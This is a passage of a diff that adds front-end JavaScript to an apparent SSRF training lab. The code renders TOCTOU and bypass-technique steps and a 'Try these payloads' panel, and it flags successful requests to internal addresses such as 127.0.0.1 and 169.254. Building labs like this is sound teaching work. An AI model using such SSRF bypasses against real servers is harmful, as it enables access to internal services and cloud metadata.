+                    html += '</div></div>';
+                }
+
+                if (details.toctouSteps) {
+                    html += '<div class="mb-4">' +
+                        '<h3 class="font-semibold mb-2 text-red-100">TOCTOU Attack Process:</h3>' +
+                        '<div class="space-y-2">';
+                    details.toctouSteps.forEach(function(step) {
+                        html += '<div class="flex items-start gap-3">' +
+                            '<span class="flex-shrink-0 w-2 h-2 bg-red-500 rounded-full mt-2"></span>' +
+                            '<p class="text-red-200 leading-relaxed">' + step + '</p>' +
+                            '</div>';
+                    });
+                    html += '</div>';
+                    if (details.bypassNote) {
+                        html += '<p class="mt-3 text-red-300 italic">' + details.bypassNote + '</p>';
+                    }
+                    
+                    // Add TOCTOU image
+                    html += '<div class="text-center mt-4">' +
+                        '<img src="toutoc.png" class="rounded mx-auto" alt="TOCTOU Race Condition" style="padding: 18px; max-width: 100%;">' +
+                        '</div>';
+                        
+                    html += '</div>';
+                }
+
+                if (details.advancedTechniques) {
+                    html += '<div class="mb-4">' +
+                        '<h3 class="font-semibold mb-2 text-red-100">Advanced Attack Techniques:</h3>' +
+                        '<div class="space-y-2">';
+                    details.advancedTechniques.forEach(function(technique) {
+                        html += '<div class="flex items-start gap-3">' +
+                            '<span class="flex-shrink-0 w-2 h-2 bg-red-500 rounded-full mt-2"></span>' +
+                            '<p class="text-red-200 leading-relaxed">' + technique + '</p>' +
+                            '</div>';
+                    });
+                    html += '</div></div>';
+                }
+
+
+                // Payloads section
+                html += '<div class="border border-slate-500 rounded-lg bg-slate-800/50">' +
+                    '<button onclick="togglePayloads(\'' + tab + '\')" class="w-full px-4 py-3 bg-red-800 hover:bg-red-700 text-red-100 rounded-t-lg text-left font-medium flex items-center justify-between transition-colors">' +
+                    '<span>💣 Try these payloads</span>' +
+                    '<span id="payload-arrow-' + tab + '" class="transform transition-transform">▼</span>' +
+                    '</button>' +
+                    '<div id="payloads-' + tab + '" class="hidden p-4 space-y-3">';
+
+                for (var i = 0; i < details.payloads.length; i++) {
+                    var payload = details.payloads[i];
+                    html += '<div class="bg-gray-900 rounded-lg p-3">' +
+                        '<div class="flex items-center gap-3 mb-2">' +
+                        '<input type="text" value="' + payload + '" class="flex-1 px-3 py-2 bg-gray-800 text-white rounded border border-gray-600 text-sm font-mono" id="payload-' + tab + '-' + i + '">' +
+                        '<button onclick="testPayload(\'' + tab + '\', ' + i + ')" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded text-sm transition-colors">' +
+                        'Test' +
+                        '</button>' +
+                        '</div>' +
+                        '<div class="text-gray-300 text-xs">' + getPayloadDescription(payload) + '</div>' +
+                        '</div>';
+                }
+
+                html += '</div></div></div>';
+                
+                wrapper.innerHTML = html;
+                if (typeof Prism !== 'undefined') {
+                    Prism.highlightAll();
+                }
+
+                // Update the defense button with dynamic content
+                updateDefenseButton(details);
+
+            }
+
+            function testCurrentEndpoint() {
+                var url = document.getElementById('url').value.trim();
+                if (!url) return;
+
+                var output = document.getElementById('output');
+                var code = document.getElementById('code');
+                var status = document.getElementById('status');
+                var initialMessage = document.getElementById('initial-message');
+                var btnText = document.getElementById('btn-text');
+                var spinner = document.getElementById('spinner');
+
+                btnText.textContent = 'Testing...';
+                spinner.classList.remove('hidden');
+                initialMessage.classList.add('hidden');
+                // Scroll to terminal section
+                document.querySelector('.terminal').scrollIntoView({ 
+                    behavior: 'smooth', 
+                    block: 'start' 
+                });
+
+
+                fetch('/' + currentTab + '?url=' + encodeURIComponent(url))
+                    .then(function(response) {
+                        return response.text().then(function(text) {
+                            return { status: response.status, text: text };
+                        });
+                    })
+                    .then(function(result) {
+                        output.classList.remove('hidden');
+                        
+                        if (result.status === 423) {
+                            status.innerHTML = '❌ <span class="text-red-400">Blocked by ' + currentTab + '</span>';
+                            code.textContent = result.text;
+                        } else if (result.status === 200) {
+                            status.innerHTML = '✅ <span class="text-green-400">Success from ' + currentTab + '</span>';
+                            
+                            var cleanContent = stripHtmlTags(result.text);
+                            // code.textContent = cleanContent || result.text;
+                            var formattedContent = formatJsonOutput(cleanContent || result.text);
+                            code.textContent = formattedContent;
+
+                            
+                            if (url.indexOf('127.0.0.1') !== -1 || url.indexOf('localhost') !== -1 || url.indexOf('169.254') !== -1 || url.indexOf('0.0.0.0') !== -1) {
+                                output.classList.add('pulse-green');
+                                setTimeout(function() {
+                                    output.classList.remove('pulse-green');
+                                }, 3000);
+                            }
+                        } else {
+                            status.innerHTML = '⚠️ <span class="text-yellow-400">Unexpected Status (' + result.status + ')</span>';
+                            code.textContent = result.text;
+                        }
+                    })
+                    .catch(function(err) {
+                        output.classList.remove('hidden');
+                        status.innerHTML = '❌ <span class="text-red-400">Network Error</span>';
+                        code.textContent = 'Error: ' + err.message;
+                    })
+                    .finally(function() {
+                        btnText.textContent = '🚀 Test';
+                        spinner.classList.add('hidden');
+                    });
+            }
+
+            // Initialize when page loads
+            window.addEventListener('load', function() {
+                // Tab switching
+                var tabButtons = document.querySelectorAll('.tab-btn');
+                for (var i = 0; i < tabButtons.length; i++) {
+                    tabButtons[i].addEventListener('click', function() {
+                        var allButtons = document.querySelectorAll('.tab-btn');
+                        for (var j = 0; j < allButtons.length; j++) {
+                            allButtons[j].classList.remove('active-tab');
+                        }
+                        this.classList.add('active-tab');
+                        
+                        currentTab = this.getAttribute('data-tab');
+                        // Reset terminal content
+                        document.getElementById('output').classList.add('hidden');
+                        document.getElementById('initial-message').classList.remove('hidden');
+                        document.getElementById('status').innerHTML = '';
+                        document.getElementById('code').textContent = '';
+
+                        // Reset defense analysis to collapsed state
+                        document.getElementById('defense-content').classList.add('hidden');
+                        document.getElementById('defense-arrow').style.transform = 'rotate(0deg)';
+                        
+                        // Clear URL input
+                        document.getElementById('url').value = '';
+                        renderTab(currentTab);
+                    });
+                }
+
+                // Enter key to trigger test
+                var urlInput = document.getElementById('url');
+                if (urlInput) {
+                    urlInput.addEventListener('keypress', function(e) {
+                        if (e.key === 'Enter') {
+                            testCurrentEndpoint();
+                        }
+                    });
+                }
+                // Initialize first tab
+                renderTab('nodefense');
+            });
+        </script>
+    </body>
+    </html>
